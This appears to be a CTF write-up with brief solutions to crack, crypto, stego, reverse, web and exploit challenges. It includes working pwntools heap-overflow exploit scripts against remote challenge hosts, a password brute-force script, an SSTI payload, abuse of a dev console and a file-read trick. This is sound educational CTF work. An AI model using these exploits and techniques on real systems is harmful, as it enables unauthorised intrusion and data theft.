# Crack 200 - Now You See Me
All of the 1030 chars on bottom are a mislead! 
real password is within MD5 of the key image  
I laughed for 1 hour - gotta love the Prof.  
```magick flag.png -decipher <10 first MD5 chars of key image> result.png```

# Crack 200 - Undocumented Outrage
wordlist: ```https://github.com/danakt/russian-words/blob/master/russian.txt```  
Encode the file as UTF-8 then crack with john.  
Password is russian word for cold rolls.

# Crack 300 - Guffaw of the Jackdaw
Its the website's name from the domain: monsterjam with some number to be Brute-Forced after.  
BF script for adding numbers:
```@echo off
setlocal enabledelayedexpansion
set wordlist=words.txt
set image_file=Crack300-1.png
set error_message=Embedded data is corrupt OR invalid password has been provided OR no algorithm found which can handle the given stego file

for /f "tokens=*" %%A in (%wordlist%) do (
    set word=%%A
    echo Trying word: !word!
    for /f "tokens=*" %%B in ('java -jar openstego.jar extract -sf %image_file% -p "!word!" 2^>^&1') do (
        set result=%%B
    )
    if "!result!" neq "%error_message%" (
        echo Success with password: !word!
        echo Output: !result!
        exit /b
    )
)
endlocal
```  
Password: monsterjam24

# Crack 300 - Return of the Mack
Find connection of Mr. Reed and Dr. P. Haze  
https://en.wikipedia.org/wiki/Sterling_Archer  
Leading eventually to: https://archer.fandom.com/wiki/934TXS  
Password: 934TXS

# Crack 400 - A Hard Row to Hoe
Path of addition: (order according to categories order)  
Crypto400 (2nd wave) - decode binary message to:        Crack400-y  
Exploit400 (10th wave) - file Crack400_hint.txt:         Crack400-z  
Forensics400 (7th Wave) - morse code in the background: Crack400-P  
Stego400 (3rd Wave) - within computer image screen:     Crack400-B  

A character appears max 1 time.

Path of subtraction:
hacker image red capital letters removed.  
typos within 400 challenges descriptions removed.  
was able to narrow alphabet to: FQXcjkpx1379%&@  
and crack it after several hours.  

# Crypto 300 - Overall a Flop
Read for several hours articles about ECC for nothing.   
Tried to brute force the private key for nothing.    
Discovered in the end that ciphertext contains unusual amount of 8a.  
split text by 8a, then xor with initial poctf to discover xor key is 55.  

# Crypto 300 - Honor the Carneia
Classical padding oracle attack, can discover two last blocks of the flag.  
First block missing last 3 chars, but upon trying to look for the sentence on google and challenge description,  
reveals its a famous quote by Marcus Aurelius.  

# Exploit 300 - The Trash Heap Has Spoken
```python
from pwn import *

exe = context.binary = ELF(args.EXE or './Exploit300-2')
io = remote('34.123.210.162', 32017)

io.sendlineafter(b"(or 'done' to finish)",b"a"*0x3f)
io.sendlineafter(b"(or 'done' to finish)",b"b"*0x27)
io.sendlineafter(b"(or 'done' to finish)",b"c"*0x7)
io.sendlineafter(b"(or 'done' to finish)",b"d"*0x7f)
io.sendlineafter(b"(or 'done' to finish)",b"a"*0x3f)
io.sendlineafter(b"(or 'done' to finish)",b"b"*0x27)
io.sendlineafter(b"(or 'done' to finish)",b"c"*0x7)
io.sendlineafter(b"(or 'done' to finish)",b"d"*0x7f)
io.sendlineafter(b"(or 'done' to finish)",b"done")

payload = b"x"*0x40
payload += p64(0) + p64(0x31)
payload += p64(exe.sym.debug_shell)

io.sendlineafter(b"expedition?:",payload)
io.interactive()
```

# Exploit 400 - Imperfect, Impermanent, and Incomplete
```python
from pwn import *


def alloc(size, data):
    io.sendlineafter(b"Choice:", b"1")
    io.sendlineafter(b"secret:", str(size).encode())
    io.sendlineafter(b"secret:", data)


def free(index):
    io.sendlineafter(b"Choice:", b"2")
    io.sendlineafter(b"(ID#):", str(index).encode())


def prepare():
    io.sendlineafter(b"Choice:", b"3")


io = remote("35.184.182.18", 32005)

alloc(0x88, b"aaa")  # 0
alloc(0x88, b"bbb")  # 1
prepare()
free(0)
alloc(0x88, b"c" * 0x88 + b"\xf0")  # overflow 1 size
free(1)  # free bigger size
alloc(0xe8, b"x" * 0x90 + b"Exploit400_flag.txt")  # 1
io.sendlineafter(b"Choice:", b"4")

io.interactive()
```

# DF 400 - No Irony in Rain
After being consumed by madness, go to his youtube channel where he uploaded the video.  
He got some comments in russian laughing at him, so why did they laugh?!  
Because the transcription in russian had different translation!!!!!!!!  
one of them reveals qwerty cipher russian version of the flag.
Hilarious! Nice work Prof!  

# Misc 300 - Decieved by Touch
For each square, there is either one triangle (=A) or two triangles (=B)  
There are 5 squares each separated by border.  
ABABB BBAAA BBBBB ABBAB ABABB BBABB BBBAA BAABA BABBB BAABB BABAB BABBB BBABA BBABB  
Throw this to cipher identifier: https://www.dcode.fr/cipher-identifier  
shows strong connection to bacon cipher --> WHAT WE DO IN LIFE  

# Misc 400 - My Synthetic Friend
### phase 1: submarines (coordinates) cipher  
```
  A B C D E
A A B C D E
B F G H I K
C L M N O P
D Q R S T U
E V W X Y Z
```
ct: BABD_BBBDACCDCDBABDCD_AAAEEE_ABEACDBBAEEE  
pt: FI_GICOOFIO_AEZ_BVOGEZ  

### phase 2: Wolseley Cipher  
key: LUNCH  
alphabet1: LUNCHABDEFGIKMOPQRSTVWXYZ  
rev. alph: ZYXWVTSRQPOMKIGFEDBAHCNUL  
ciphertex: FIGICOOFIOAEZBVOGEZ  
plaintext: PMOMWGGPMGTQLSHGOQL  

### phase 3: Bazeries Cipher  
This was a good reference for me:  
```https://sites.google.com/site/cryptocrackprogram/user-guide/cipher-types/substitution/bazeries```  
numeric key: 23  
grid 1: AFLQVBGMRWCHNSXDIOTYEKPUZ  
grid 2: TWENYHRABCDFGIKLMOPQSUVXZ  
cipher: PMOMWGGPMGTQLSHGOQL  
plaint: TO_INFINITY_AND_BEYOND  

# Reverse 300 - Think Different, Be Similar
Its a .net compiled application into exe.  
Opening it with ILspy reveals the request structure needed to be sent to https://www.nvstgt.com/ to fetch the flag.  

# Reverse 300 - Beef-Witted Mushrumps
There is a vm which does 6 operations: read, write to memory, add, subtract xor and print.  
Upon inspecting the provided bytecode, it seems each char is xored with the next in memory and printed.  
reversing this xor, with the known flag prefix reveals the flag.  

# Reverse 400 - Forjeskit Sair with Weary Legs
Ida reveals python code packed into executable.  
1. pyinstxtractor to unpack exe to python compiled files.  
2. use pycdc to decompile pyc into py sourcecode.  
3. manual deobfuscation  
4. pyarmor deobfuscation  
5. manual deobfuscation

# Stego 200 - You Never Liked My Music
view spectogram at high freq, 20000 - strong signals which look like morse!  
Zooming in, discovering a binary pattern every 0.06secs - signal presence means 1, 0 otherwise.  
decoded the binary to the flag.  

# Stego 300 - Public Lies Private Truths
/encode_grid.js reveals 38 divs. Makes sense that each one is char in the flag.  
Upon inspecting the brightness and opacity, i found a logic.  
For ex. second div must be o, so 0.4 and 250% - 25*10 = o  
3rd must be c, also 0.4 and 130% - 13*10 more  
25-13=12 which is exactly the ordinal diff between o and c.  
continuing like this reveals all the flag.  

# Stego 300 - Observing Arming
Extract hidden channel using ffmpeg.  
Viewing spectogram reveals a repetitive pattern every 2 seconds.  
The idea is to extract fft values every 0.05 seconds,  
increasing resolution by applying hanning to the segment and padding,  
then extracting the dominant freq.  

```python
import wave

import numpy as np

# Parameters
sample_rate = 44100  # Sampling rate in Hz
window_duration = 0.05  # Window size in seconds
window_length = int(sample_rate * window_duration)

# Frequency range for ASCII detection
low_freq = 32  # Lower bound in Hz
high_freq = 128  # Upper bound in Hz

file_path = "2_seconds.wav"

with wave.open(file_path, 'rb') as wav_file:
    sample_rate = wav_file.getframerate()  # Sampling rate
    n_channels = wav_file.getnchannels()  # Number of audio channels
    n_samples = wav_file.getnframes()  # Total number of samples
    duration = n_samples / sample_rate  # Duration in seconds
    audio_data = wav_file.readframes(n_samples)
    audio_array = np.frombuffer(audio_data, dtype=np.int16)  # Convert to NumPy array

flag = ""
# Analyze data in chunks
for i in range(0, len(audio_array), window_length):
    segment = audio_array[i:i + window_length]
    if len(segment) < window_length:
        break  # Skip last segment if smaller than window size

    segment = segment * np.hanning(len(segment))
    zero_padded_segment = np.pad(segment, (0, sample_rate - len(segment)), 'constant')

    # Perform FFT
    fft_magnitude = np.abs(np.fft.rfft(zero_padded_segment))
    freqs = np.fft.rfftfreq(len(zero_padded_segment), d=1/sample_rate)

    # Filter frequencies in the range 32–128 Hz
    mask = (freqs >= low_freq) & (freqs <= high_freq)
    filtered_freqs = freqs[mask]
    filtered_magnitude = fft_magnitude[mask]

    # Find dominant frequency in the range
    if len(filtered_freqs) > 0:
        dominant_freq = filtered_freqs[np.argmax(filtered_magnitude)]
        ascii_character = chr(int(dominant_freq))  # Map frequency to ASCII
        print(f"Dominant Frequency: {dominant_freq:.2f} Hz -> ASCII: {ascii_character}")
        flag += ascii_character

print(flag)
```

# Stego 400 - He Pretends to Be a Boor
open image in hex editor shows flag is scrambled in one of the first chunks of the jpeg.  
Upon reading about quantization table chunk, it appears its encoded in a diagonal zig-zag way.  
Reconstructing the flag the same way reveals it.  
Cool non-standard steg challenge i liked this one!  

# Web 300 - Do As I Say Not As I Do
Find The Prof. username from home page.  
Crack the password using rockyou wordlist - password: "password"!  
SSTI on description field under /upload: {{config}}  

# Web 300 - Emperfect Copies
description talks about /login page.  
/console also available, werkzeug is in dev mode.  
upon supplying username: {} on submit, an error exposes some of the source code containing the credentials.  
Login, then again description talks about /admin/flag - access it with token within Authrization Bearer header.  

# Web 400 - A Bitter Delicacy
/login - submit wrong creds reveals: view-file log/error.log  
so lets try to go to /view-file?file=log/error.log  
Enumerate  
Enumerate more  
Enumerate to hell and back  
Enumerate in russian  
Read the challenge description for the 51th time:
```I've hidden all other sensitive information using cutting-edge Linux methods```  
FINALLY find /view-file?file=.hidden/flag.txt
